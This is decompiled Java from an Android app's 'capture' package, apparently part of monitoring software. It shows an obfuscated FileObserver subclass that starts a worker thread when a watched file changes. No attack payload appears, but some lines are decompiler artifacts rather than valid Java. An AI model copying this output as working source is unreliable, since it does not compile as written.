package com.vvt.capture.b.a;

import android.os.FileObserver;
import java.io.File;

class f
  extends FileObserver
{
  private String a;
  private Thread b = null;
  private File c;
  
  public f(d paramd, String paramString, int paramInt)
  {
    super(paramString, paramInt);
    this.a = paramString;
  }
  
  public String a()
  {
    return this.a;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = d.c();
      if (bool) {}
      localThread = new java/lang/Thread;
      g localg = new com/vvt/capture/b/a/g;
      localg.<init>(this);
      localThread.<init>(localg);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */